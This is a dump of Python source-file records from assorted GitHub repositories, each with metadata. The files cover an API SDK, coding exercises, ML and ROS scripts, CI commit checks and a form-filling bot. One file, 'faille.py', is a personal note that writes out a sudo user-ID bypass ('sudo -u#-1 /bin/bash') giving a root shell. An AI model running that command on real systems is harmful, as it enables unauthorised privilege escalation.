{"blob_id": "842b0e029a9d3e87a5e0a33a7d76de2cb72a3ccd", "directory_id": "c85a6d674679780ee510b5c8c3dbcbdecc859f64", "path": "/swagger_client/__init__.py", "content_id": "3d74d68b52cf9561f2ad3314cd8c0b2e8674ea96", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "cbrowet-axway/APIM_sdk", "snapshot_id": "d4f4a124e86a7b2e65d0ef07b54c68e95de68337", "revision_id": "4f82df67ebe3dd6eae645bab8f86e72c0347ee24", "branch_name": "refs/heads/master", "visit_date": "2020-05-25 13:22:35.802350", "revision_date": "2020-04-16 09:25:21", "committer_date": "2020-04-16 09:25:21", "github_id": "187820389", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5955", "extension": "py", "content": "# coding: utf-8\n\n# flake8: noqa\n\n\"\"\"\n    API Manager API v1.3\n\n    No description provided (generated by Swagger Codegen https://github.com/swagger-api/swagger-codegen)  # noqa: E501\n\n    OpenAPI spec version: 1.3.0\n    Contact: support@axway.com\n    Generated by: https://github.com/swagger-api/swagger-codegen.git\n\"\"\"\n\n\nfrom __future__ import absolute_import\n\n# import apis into sdk package\nfrom swagger_client.api.api_discovery_api import APIDiscoveryApi\nfrom swagger_client.api.api_manager_services_api import APIManagerServicesApi\nfrom swagger_client.api.api_proxy_registration_api import APIProxyRegistrationApi\nfrom swagger_client.api.api_repository_api import APIRepositoryApi\nfrom swagger_client.api.applications_api import ApplicationsApi\nfrom swagger_client.api.current_user_api import CurrentUserApi\nfrom swagger_client.api.login_api import LoginApi\nfrom swagger_client.api.metrics_api import MetricsApi\nfrom swagger_client.api.migrate_api import MigrateApi\nfrom swagger_client.api.o_auth_authorizations_api import OAuthAuthorizationsApi\nfrom swagger_client.api.organizations_api import OrganizationsApi\nfrom swagger_client.api.quotas_api import QuotasApi\nfrom swagger_client.api.users_api import UsersApi\n\n# import ApiClient\nfrom swagger_client.api_client import ApiClient\nfrom swagger_client.configuration import Configuration\n# import models into sdk package\nfrom swagger_client.models.api import API\nfrom swagger_client.models.api_access import APIAccess\nfrom swagger_client.models.api_definition import APIDefinition\nfrom swagger_client.models.api_key import APIKey\nfrom swagger_client.models.api_promotion import APIPromotion\nfrom swagger_client.models.alert_config import AlertConfig\nfrom swagger_client.models.application import Application\nfrom swagger_client.models.application_request import ApplicationRequest\nfrom swagger_client.models.authenticated_user_attributes import AuthenticatedUserAttributes\nfrom swagger_client.models.authentication_profile import AuthenticationProfile\nfrom swagger_client.models.authorization import Authorization\nfrom swagger_client.models.authorization_code import AuthorizationCode\nfrom swagger_client.models.backend_blob import BackendBlob\nfrom swagger_client.models.backend_export import BackendExport\nfrom swagger_client.models.backend_method_export import BackendMethodExport\nfrom swagger_client.models.ca_cert import CACert\nfrom swagger_client.models.cors_profile import CORSProfile\nfrom swagger_client.models.config import Config\nfrom swagger_client.models.custom_properties_config import CustomPropertiesConfig\nfrom swagger_client.models.custom_property import CustomProperty\nfrom swagger_client.models.custom_property_option import CustomPropertyOption\nfrom swagger_client.models.custom_property_permission import CustomPropertyPermission\nfrom swagger_client.models.discovery_api import DiscoveryAPI\nfrom swagger_client.models.error_response import ErrorResponse\nfrom swagger_client.models.export_options import ExportOptions\nfrom swagger_client.models.external_client import ExternalClient\nfrom swagger_client.models.frontend_export import FrontendExport\nfrom swagger_client.models.grant_types import GrantTypes\nfrom swagger_client.models.group import Group\nfrom swagger_client.models.host import Host\nfrom swagger_client.models.implicit import Implicit\nfrom swagger_client.models.inbound_profiles import InboundProfiles\nfrom swagger_client.models.lock import Lock\nfrom swagger_client.models.login_endpoint import LoginEndpoint\nfrom swagger_client.models.method import Method\nfrom swagger_client.models.metric_field import MetricField\nfrom swagger_client.models.metric_timeline import MetricTimeline\nfrom swagger_client.models.number import Number\nfrom swagger_client.models.o_auth_app_scope import OAuthAppScope\nfrom swagger_client.models.o_auth_client import OAuthClient\nfrom swagger_client.models.o_auth_protected_resource import OAuthProtectedResource\nfrom swagger_client.models.o_auth_resource import OAuthResource\nfrom swagger_client.models.operation import Operation\nfrom swagger_client.models.organization import Organization\nfrom swagger_client.models.outbound_profiles import OutboundProfiles\nfrom swagger_client.models.param_value import ParamValue\nfrom swagger_client.models.parameter import Parameter\nfrom swagger_client.models.permission_dto import PermissionDTO\nfrom swagger_client.models.portal_traffic_listener import PortalTrafficListener\nfrom swagger_client.models.quota_api_constraint_dto import QuotaApiConstraintDTO\nfrom swagger_client.models.quota_dto import QuotaDTO\nfrom swagger_client.models.referenced_entity import ReferencedEntity\nfrom swagger_client.models.registration_token import RegistrationToken\nfrom swagger_client.models.remote_host import RemoteHost\nfrom swagger_client.models.response_code import ResponseCode\nfrom swagger_client.models.schema_object import SchemaObject\nfrom swagger_client.models.scope import Scope\nfrom swagger_client.models.security_device import SecurityDevice\nfrom swagger_client.models.security_profile import SecurityProfile\nfrom swagger_client.models.series import Series\nfrom swagger_client.models.service import Service\nfrom swagger_client.models.service_profiles import ServiceProfiles\nfrom swagger_client.models.swagger import Swagger\nfrom swagger_client.models.swagger_security_device import SwaggerSecurityDevice\nfrom swagger_client.models.swagger_security_profile import SwaggerSecurityProfile\nfrom swagger_client.models.system_config import SystemConfig\nfrom swagger_client.models.token_endpoint import TokenEndpoint\nfrom swagger_client.models.token_request_endpoint import TokenRequestEndpoint\nfrom swagger_client.models.topology import Topology\nfrom swagger_client.models.user import User\nfrom swagger_client.models.virtualized_api import VirtualizedAPI\nfrom swagger_client.models.virtualized_api_method import VirtualizedAPIMethod\nfrom swagger_client.models.virtualized_method_export import VirtualizedMethodExport\n"}
{"blob_id": "72491c5b907985f31e338bc131108a4eb48ec589", "directory_id": "d24ebd1fd3f42da9274c4eb45a77742dc8d1982f", "path": "/PYTHON/3\uc6d4 2\uc77c/5.4-2.py", "content_id": "cfe560c88a1bcb83990a9b7965625913766c4e79", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "mongbro/TIL", "snapshot_id": "951dcceaf5ca39db402c7316907813971eab1449", "revision_id": "f8604bdaabe4671db4c969fa49b308de4e7f96d4", "branch_name": "refs/heads/master", "visit_date": "2021-09-09 14:45:04.815490", "revision_date": "2021-08-29 16:29:17", "committer_date": "2021-08-29 16:29:17", "github_id": "187811725", "star_events_count": "0", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "820", "extension": "py", "content": "from collections import deque\n\nn, m = map(int , input().split())\narr = []\nfor i in range(n):\n    arr.append(list(map(int, input().split())))\n\ndx = [-1, 0, 1, 0]\ndy = [0, 1, 0, -1]\n\ndef bfs(x, y):\n    qu = deque()\n    qu.append((x, y))\n    while qu:\n        x, y = qu.popleft()\n        for i in range(4):\n            nx = x + dx[i]\n            ny = y + dy[i]\n            if nx < 0 or nx >= n or ny < 0 or ny >= m:\n                continue\n            if arr[nx][ny] == 0:\n                continue\n            if arr[nx][ny] == 1:\n                if nx == 0 and ny == 0:\n                    continue\n                arr[nx][ny] = arr[x][y] + 1\n                qu.append((nx, ny))\n    return arr[n - 1][m - 1]\n\nprint(bfs(0, 0))\nfor i in range(n):\n    for j in range(m):\n        print('%2d' % arr[i][j], end=' ')\n    print()"}
{"blob_id": "811108b45aec12d2fdac7179d0b5712ff0fde1a3", "directory_id": "e13c12497d6c2b189b7bd0fd21c293bd3f9a82c5", "path": "/desafios/Ex004.py", "content_id": "0e9db7ab6ba8f7a04c9782b9706fb87a2175468a", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "FelipeAlafy/Python", "snapshot_id": "7898bd9be1131ede89af0839b8735e5fa225f225", "revision_id": "da2374e55e8aa84e4ca6d9c7bf8dafeb546a4742", "branch_name": "refs/heads/master", "visit_date": "2022-12-03 20:48:36.899800", "revision_date": "2020-08-03 18:39:55", "committer_date": "2020-08-03 18:39:55", "github_id": "284721410", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2020-08-03 18:39:56", "gha_created_at": "2020-08-03 14:25:24", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "642", "extension": "py", "content": "valor = input('Digite qualquer coisa e eu vou indentificala > ')\nprint(\"\\033[31m--------------------------\\n\"\n      \"     Indentificando\\n\"\n      \"--------------------------\\033[m\")\nprint(\"O tipo \u00e9 {}\\nAlpha N\u00famerio {}\\nAlfabeto {}\\nTabela Ascii {}\\nEm caixa alta {}\\nDecimal {}\\nDigito {}\\nCaixa baixa\"\n      \" {}\\nIntificavel {}\\nN\u00famerico {}\\nImprimivel {}\\nEspa\u00e7o {}\\nTitulo {}\".format(type(valor), valor.isalnum(), valor.isalpha(),\n      valor.isascii(), valor.isupper(), valor.isdecimal(),\n      valor.isdigit(), valor.islower(), valor.isidentifier(), valor.isnumeric(), valor.isprintable(), valor.isspace(),\n      valor.istitle()))\n"}
{"blob_id": "970052a55f375ecee9553f24eb9852ddfc9a8962", "directory_id": "116acf603f5db8d626247355bf786c339ba95ea9", "path": "/libs/options.py", "content_id": "2cc4a75cb027d45077396d591f2b05a0f1016b80", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "dahunuaa/ZhihuiSMB_python3", "snapshot_id": "0857afeec2337b44571986a9c70c26e716142ccb", "revision_id": "8db2708efccd5eefa393738500e326bd7fb65c21", "branch_name": "refs/heads/master", "visit_date": "2021-01-25 14:32:32.201879", "revision_date": "2018-03-11 05:59:10", "committer_date": "2018-03-11 05:59:10", "github_id": "123703184", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1854", "extension": "py", "content": "# -*- coding:utf-8 -*-\n\"\"\"\nalter by:dahu\nalter on:2016-11-17\n\"\"\"\nimport os\nimport logging\nfrom tornado.options import parse_command_line, options, define\nfrom ZhihuiSMB.libs import configlib\n\ndef get_base_config():\n    root_path = configlib.root_path\n    os.chdir(root_path+'/configs')\n    cfg=configlib.Config('base.icfg')\n    cfg.addNamespace(configlib)\n    os.chdir(root_path)\n    return cfg\n\ndef parse_config_file(path):\n    \"\"\"Rewrite tornado default parse_config_file.\n\n    Parses and loads the Python config file at the given path.\n\n    This version allow customize new options which are not defined before\n    from a configuration file.\n    \"\"\"\n    config = {}\n    with open(path, 'r', encoding='utf-8') as f:\n        code = compile(f.read(), path, 'exec')\n        exec(code, config, config)\n    # execfile(path, config, config)\n    for name in config:\n        if name in options:\n            options[name].set(config[name])\n        else:\n            define(name, config[name])\n\n\ndef parse_options():\n    _root = ''\n    _settings = os.path.join(_root, \"settings.py\")\n    # _projects_configs = [os.path.join(_root, \"package2.icfg\"),os.path.join(_root, \"package.icfg\")]\n    # _settings_local = os.path.join(_root, \"settings_local.py\")\n\n    try:\n        parse_config_file(_settings)\n        # parse_projects_config_file(_projects_configs)\n        logging.info(\"Using settings.py as default settings.\")\n    except Exception as e:\n        import traceback\n        print(traceback.format_exc())\n        logging.error(\"No any default settings, are you sure? Exception: %s\" % e)\n    '''\n    try:\n        parse_config_file(_settings_local)\n        logging.info(\"Override some settings with local settings.\")\n    except Exception, e:\n        logging.error(\"No local settings. Exception: %s\" % e)\n    '''\n    parse_command_line()\n\nconfig = get_base_config()"}
{"blob_id": "20d4543517408ccabbf8809a0782e5933d7b224e", "directory_id": "2840ee5935ff825ed8451a4a177c98e5d58ca62b", "path": "/note en cour/faille.py", "content_id": "52c37dcb489080ec5fd2036e65a4b539cbc9d76e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "lara58/Notes", "snapshot_id": "763c4e209ea850773c541a6636e4f73ea626d176", "revision_id": "d7fb73e7b9b3c6b5e4cca356868f24c29a7ded22", "branch_name": "refs/heads/main", "visit_date": "2023-06-03 02:06:43.968282", "revision_date": "2021-06-17 23:07:18", "committer_date": "2021-06-17 23:07:18", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "182", "extension": "py", "content": "#Linux/Unix exploit allows some restricted commands to be run as root without clearance\nsudo -u#-1 /bin/bash\nsudo -u#-1 id -u and \nsudo -u#4294967295 id -u \nsudo -u \\#$((0xffffffff))"}
{"blob_id": "300f2925658e25ef10b3f99ef0e62a3e6efec5f5", "directory_id": "3b4295b0ae63ec6bbd3461d7963e3f5f12caaebf", "path": "/pipeline/map_object_classifier.py", "content_id": "dabe2d491ff119af227afa37dab2ac2a23a29a76", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "aurioldegbelo/map-vectorization-pipeline", "snapshot_id": "38c12e386c8d620167727370b7411c3e3c135b5c", "revision_id": "beb5150c15459de72bf26f6c3c6ad6fa78c678c0", "branch_name": "refs/heads/master", "visit_date": "2023-08-01 14:59:07.675111", "revision_date": "2021-08-11 12:29:09", "committer_date": "2021-08-11 12:29:09", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3846", "extension": "py", "content": "from pathlib import Path\n\nimport cv2\nfrom skimage.color import rgb2hsv\nfrom skimage.exposure import exposure\nfrom sklearn import preprocessing\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.svm import SVC\nfrom sklearn.metrics import confusion_matrix\nfrom sklearn.metrics import classification_report\nimport seaborn as sns\nimport global_variables\nimport enum\nfrom pipeline.feature_extraction import FeaturesType, FeatureExtractor\n\n\nclass Models(enum.Enum):\n    RANDOMFOREST = 1\n    SVM = 2\n\n\nclass MapObjectsClassifier:\n    def __init__(self, features=FeaturesType.SPECTRAL_SHAPE, model=Models.RANDOMFOREST):\n        self.featuresType = features\n        self.extracted_features_path = Path(global_variables.weights_path, 'features.pkl')\n        self.selected_features_list = np.array(features.get_selected_features())\n        self.featureExtractor = FeatureExtractor(self.selected_features_list, self.extracted_features_path)\n        x, y = self.featureExtractor()\n        self.initialize_model(model, x, y, analysis=False)\n        print('Map Objects Classifier using {} and {} features is Ready'.format(model.name, features.name))\n\n    def predict(self, image, poly_mask, poly, map_contours):\n        feature_vector = self.featureExtractor.extract_features_from_polygon(image, poly_mask, poly,\n                                                                             map_contours)\n\n        label = self.clf.predict(self.scaler.transform(feature_vector.reshape(1, -1)))[0]\n        probability = self.clf.predict_proba(self.scaler.transform(feature_vector.reshape(1, -1)))[0]\n\n        return dict(fill=global_variables.visualization_colors[label],\n                    type=label,\n                    probability=dict(background=probability[0], building=probability[1], water=probability[2]))\n\n    def initialize_model(self, model, x, y, analysis=False):\n        x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.2, random_state=42, stratify=y)\n        self.scaler = preprocessing.StandardScaler().fit(x_train)\n        if model == Models.RANDOMFOREST:\n            self.clf = RandomForestClassifier(class_weight='balanced', max_depth=8, n_estimators=300)\n        elif model == Models.SVM:\n            self.clf = SVC(probability=True)\n\n        self.clf.fit(self.scaler.transform(x_train), y_train)\n\n        if analysis:\n            self.evaluation_print(self.scaler.transform(x_test), y_test, self.featuresType)\n\n    def evaluation_print(self, x_test, y_test, featureType):\n        y_pred = self.clf.predict(x_test)\n        print(classification_report(y_test, y_pred))\n        # Get and reshape confusion matrix data\n        matrix = confusion_matrix(y_test, y_pred)\n        matrix = matrix.astype('float') / matrix.sum(axis=1)[:, np.newaxis]\n\n        # Build the plot\n        plt.figure(figsize=(10, 7))\n        sns.set(font_scale=2.2)\n        sns.heatmap(matrix, annot=True, annot_kws={'size': 25},\n                    cmap=plt.cm.Reds)\n        # Add labels to the plot\n        class_names = ['background', 'building', 'water']\n        tick_marks = np.arange(len(class_names))\n        tick_marks2 = tick_marks + 0.28\n        tick_marks2[0] = tick_marks2[0] - 0.2\n        tick_marks = tick_marks + 0.5\n        plt.xticks(tick_marks, class_names, rotation=0)\n        plt.yticks(tick_marks2, class_names, rotation=90)\n        plt.xlabel('Predicted label', labelpad=13)\n        plt.ylabel('True label', labelpad=13)\n\n        plt.title('Map Objects Classifier using {}'.format(featureType.name))\n        # plt.savefig(\"conf-{}.pdf\".format(featureType.name), bbox_inches='tight')\n        plt.show()\n\n\nif __name__ == '__main__':\n    MapObjectsClassifier(None, FeaturesType.SPECTRAL_SHAPE, Models.RANDOMFOREST)\n"}
{"blob_id": "f9eb3e23a4519355de19c33061c7ac7b002bb0f8", "directory_id": "67bda7b473d544d040d3dfc66168bf31eceecffa", "path": "/.gitlab-ci/check-commit.py", "content_id": "e0db2de967d45b7f20778b18eae0ca3e84d1398d", "detected_licenses": "['MIT', 'LicenseRef-scancode-warranty-disclaimer']", "license_type": "permissive", "repo_name": "hyyoxhk/ci-templates", "snapshot_id": "f87b3a86190edda95f9296d8cca0d7c2d8c599a9", "revision_id": "4a73f030d0602042cfa44ed94dc5e744b52f57aa", "branch_name": "refs/heads/master", "visit_date": "2023-07-31 22:34:52.517429", "revision_date": "2020-03-09 22:41:37", "committer_date": "2020-03-09 22:41:37", "github_id": "407366632", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2553", "extension": "py", "content": "#!/usr/bin/env python3\n#\n# This script tests a few things against the commit messages, search for\n# `def test_` to see the actual tests run.\n\nimport git\nimport os\nimport pytest\n\n# Environment variables set by gitlab\nCI_COMMIT_SHA = os.environ['CI_COMMIT_SHA']\nCI_MERGE_REQUEST_TARGET_BRANCH_NAME = 'master'\nCI_SERVER_HOST = os.environ['CI_SERVER_HOST']\n\n# We need to add the real libinput as remote, our origin here is the user's\n# fork.\nrepo = git.Repo('.')\nupstream = repo.create_remote('upstream', f'https://{CI_SERVER_HOST}/wayland/ci-templates.git')\nupstream.fetch()\n\nsha = CI_COMMIT_SHA\nbranch = CI_MERGE_REQUEST_TARGET_BRANCH_NAME\n\ncommits = list(repo.iter_commits(f'upstream/{branch}..{sha}'))\n\n\ndef error(commit, message, long_message=''):\n    if long_message:\n        long_message = '\\n\\n\\t' + long_message.replace('\\n', '\\n\\t')\n    return f'on commit {str(commit)[:8]} \"{commit.summary}\": {message}{long_message}'\n\n\n@pytest.mark.parametrize('commit', commits)\nclass TestCommits:\n    def test_author_email(self, commit):\n        assert '@users.noreply.gitlab.freedesktop.org' not in commit.author.email, \\\n            error(commit, 'git author email invalid',\n                  ('Please set your name and email with the commands\\n',\n                   '    git config --global user.name Your Name\\n'\n                   '    git config --global user.email your.email@provider.com\\n'))\n\n    def test_signed_off_by(self, commit):\n        if not commit.message.startswith('Revert \"'):\n            assert 'Signed-off-by:' in commit.message, \\\n                error(commit, 'missing Signed-off-by tag',\n                      'Please add the required \"Signed-off-by: author information\" line to the commit message')\n\n    def test_fixup(self, commit):\n        assert not commit.message.startswith('fixup!'), \\\n            error(commit, 'Remove fixup! tag',\n                  'Leftover \"fixup!\" commit message detected, please squash')\n        assert not commit.message.startswith('squash!'), \\\n            error(commit, 'Remove squash! tag',\n                  'Leftover \"squash!\" commit message detected, please squash')\n\n    def test_line_length(self, commit):\n        lines = commit.message.split('\\n')\n        first_line = lines[0]\n\n        assert len(first_line) < 85, \\\n            error(commit, 'Commit message subject line too long')\n\n        try:\n            second_line = lines[1]\n            assert second_line == '', \\\n                error(commit, 'Second line in commit message must be emtpy')\n        except IndexError:\n            pass\n"}
{"blob_id": "475f8a5ac4bcb9aa992989ab676eaa5a85e31ac5", "directory_id": "c09d87297ca7a27fc7a01d30c951c40d07e77bcb", "path": "/src/programming_robots_with_ros/src/chapter7/red_light_green_light.py", "content_id": "fc6d0fe44e1781e469ee6903709394926085714c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "danielhsf/catkin_ws", "snapshot_id": "74f22a0bb070339af3518217e2b0ed38e1f4a159", "revision_id": "94d81ad35574d4358261001f22289b3f0cecde7f", "branch_name": "refs/heads/master", "visit_date": "2020-04-14 18:10:36.231811", "revision_date": "2019-07-05 19:59:47", "committer_date": "2019-07-05 19:59:47", "github_id": "164008134", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "750", "extension": "py", "content": "#!/usr/bin/env python\nimport rospy\nfrom geometry_msgs.msg import Twist\n\ncmd_vel_pub = rospy.Publisher('/cmd_vel_mux/input/teleop', Twist, queue_size=1)\nrospy.init_node('red_light_green_light')\nred_light_twist = Twist()\ngreen_light_twist = Twist()\ngreen_light_twist.linear.x = 0.5\ndriving_forward = False\nlight_change_time = rospy.Time.now()\nrate = rospy.Rate(2)\n\nprint(rospy.is_shutdown())\nwhile not rospy.is_shutdown():\n    if driving_forward:\n        print('Enter here')\n        cmd_vel_pub.publish(green_light_twist)\n    else:\n        cmd_vel_pub.publish(red_light_twist)\n    if light_change_time > rospy.Time.now():\n        driving_forward = not driving_forward\n        light_change_time = rospy.Time.now() + rospy.Duration(3)\n    rate.sleep()\n\n\n"}
{"blob_id": "9cfdf4b4182f3baaaa11f514df2659568afa1504", "directory_id": "19c20b3370eb4d4c86f168c9eaf50d2252761885", "path": "/skrypcik.py", "content_id": "08c6bcf3b7dcfc48ed9ea0b84865eb76316b94d8", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "JankesMateusz/CarsForDatabase", "snapshot_id": "cebdd5c2db53dc44d7714a1ae534adbdbac2dca1", "revision_id": "93d8f21ec018c9c43aa0dbb079765f4893532a7f", "branch_name": "refs/heads/master", "visit_date": "2020-03-26 09:46:54.850377", "revision_date": "2018-08-14 19:38:36", "committer_date": "2018-08-14 19:38:36", "github_id": "144764444", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1253", "extension": "py", "content": "car_list = [\"ACURA\", \"AMERICAN IRONHORSE\",\"APRILIA\", \"ARCTIC CAT\", \"AUTOCAR LLC.\", \"AVANTI\",\n            \"BENTLEY\", \"BIG DOG\", \"BLUE BIRD\", \"BOMBARDIER\", \"BUELL\", \"BUICK\", \"CANNONDALE\",\n            \"CHEVROLET\", \"CHRYSLER\", \"COBRA\", \"COUNTRY COACH MOTORHOME\", \"DODGE\", \"DUCATI\",\n            \"E-TON\", \"EL DORADO\", \"FERRARI\", \"FREIGHTLINER\", \"GILLIG\", \"GMC\", \"HARLEY DAVIDSON\",\n            \"HINO\", \"HM\", \"HUMMER\", \"HUSABERG\", \"HUSQVARNA\", \"HYOSUNG\", \"INTERNATIONAL\",\n            \"ISUZU\", \"JOHN DEERE\", \"KASEA\", \"KAWASAKI\", \"KENWORTH\", \"KTM\", \"KUBOTA\",\n            \"KYMCO\", \"LAMBORGHINI\", \"LINCOLN\", \"MACK\", \"MASERATI\", \"MAYBACH\", \"MERCURY\",\n            \"MORGAN\", \"MOTO GUZZI\", \"MOTOR COACH INDUSTRIES\", \"MV AGUSTA\", \"NEW FLYER\",\n            \"ORION BUS\", \"OSHKOSH MOTOR TRUCK CO.\", \"PANOZ\", \"PETERBILT\", \"POLARIS\", \"PONTIAC\",\n            \"PORSCHE\", \"ROLLS ROYCE\", \"SALEEN\", \"SATURN\", \"SCION\", \"SEA-DOO\", \"SKI-DOO\",\n            \"STERLING\", \"STERLING TRUCK\", \"SUZUKI\", \"TM\", \"TRIUMPH\", \"UD\", \"VENTO\", \"VESPA\",\n            \"VICTORY\", \"WESTERN RV\", \"WORKHORSE\", \"YAMAHA\"]\n\nwith open(\"cars.txt\", \"r\") as oldfile, open(\"new_cars.txt\", \"w\") as newfile:\n    for line in oldfile:\n        if not any(car in line for car in car_list):\n            newfile.write(line)\n\n"}
{"blob_id": "a93e390e0b5b10be8b47e66e2855e4fc74f73c0b", "directory_id": "3e347ac6904a975ba923457fb3fd6b4a0d0086e3", "path": "/backend/migrations/versions/7dd571d1c7f5_.py", "content_id": "f9a85dd58595c68470392e8704a032e3ea6a68f0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mahmoudodoo/Full-Stack-Shop", "snapshot_id": "a5e7c1d3d42df62443e0a08f48c391d3c624e4ac", "revision_id": "bdebb2198bd115d421e6f89944a6d76a170898e5", "branch_name": "refs/heads/main", "visit_date": "2023-03-05 07:02:08.444045", "revision_date": "2021-02-08 11:42:26", "committer_date": "2021-02-08 11:42:26", "github_id": "331521970", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "663", "extension": "py", "content": "\"\"\"empty message\n\nRevision ID: 7dd571d1c7f5\nRevises: 258adad8ba12\nCreate Date: 2021-01-26 15:26:11.130141\n\n\"\"\"\nfrom alembic import op\nimport sqlalchemy as sa\n\n\n# revision identifiers, used by Alembic.\nrevision = '7dd571d1c7f5'\ndown_revision = '258adad8ba12'\nbranch_labels = None\ndepends_on = None\n\n\ndef upgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.create_foreign_key(None, 'order', 'user', ['user_id'], ['id'])\n    # ### end Alembic commands ###\n\n\ndef downgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.drop_constraint(None, 'order', type_='foreignkey')\n    # ### end Alembic commands ###\n"}
{"blob_id": "c711f97020682ba5737db4d9e9ab5b523afb613d", "directory_id": "514f0b846942dc3fe53fd0dd3c1a25d4b8b25d08", "path": "/k8s/testing copy.py", "content_id": "c3089b4fa5ba225cfb7950add40f7cac2b60345a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "neerajlove/abc", "snapshot_id": "91be857d994e556af0aff7d89a2a0341ce0c66d5", "revision_id": "4c532d96c72d9eac94fda72e6fdf1de7277182a9", "branch_name": "refs/heads/master", "visit_date": "2020-12-13 22:06:10.457965", "revision_date": "2020-04-07 07:26:11", "committer_date": "2020-04-07 07:26:11", "github_id": "234543442", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1855", "extension": "py", "content": "import csv\nimport math\n\nfrom selenium import webdriver\n\nbrowser = webdriver.Firefox()\n\nbrowser.get(\"https://forms.gle/QdsBB7FjscS2KYnq6\")\n\n\n\n#names = browser.find_element_by_name('entry.2005620554')\n#ar1 = names.send_keys(\"name\") \n#phoneno = browser.find_element_by_name('entry.1045781291')\n#ar2 = Phoneno.send_keys(\"4567\")\n#emailid = browser.find_element_by_name('entry.828990748')\n#ar3 = emailid.send_keys(\"qwwe\") \n#date = browser.find_element_by_name('entry.1166974658')\n#ar4 = date.send_keys(\"date\")\nselect = browser.find_element_by_xpath('/html/body/div/div[2]/form/div/div/div[3]/div[1]/div/div/span/span').click()\n\n\"\"\"inputs = []\ninputs.append(names)\ninputs.append(phoneno)\ninputs.append(emailid)\ninputs.append(date)\n\"\"\"\n\nfilename = \"/Users/neeraj.joshi/Downloads/test.csv\"\nprint(filename)\nwith open(filename, 'r') as f:\n kill = csv.reader(f, delimiter=\",\") \n array = [ ]\n\n for line in kill:\n   array.append(line)\n   a = (len(array))\n   \n for row in array:\n       browser.get(\"https://forms.gle/QdsBB7FjscS2KYnq6\")\n       inputs = browser.find_elements_by_tag_name(\"input\")\n       print(inputs)\n       if(len(row) != 0):\n             index = 0 \n             for i in inputs:\n                 if(i.get_attribute(\"type\") != \"hidden\"):\n                         i.send_keys(row[index])\n                         index += 1\n             browser.find_element_by_xpath('/html/body/div/div[2]/form/div/div/div[3]/div[1]/div/div/span/span').click()\n                        \nbrowser.close()\n\n\n\"\"\"\nfor i in range(100):\n    names.send_keys(dd[i])\n    phoneno.send_keys(dd[i+1])\n    emailid.send_keys(dd[i+2]) \n    date.send_keys(dd[i+3])\n    select = browser.find_element_by_xpath('/html/body/div/div[2]/form/div/div/div[3]/div[1]/div/div/span/span').click()\n    back = browser.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/div/div[4]/a').click()\n\n\n\"\"\""}
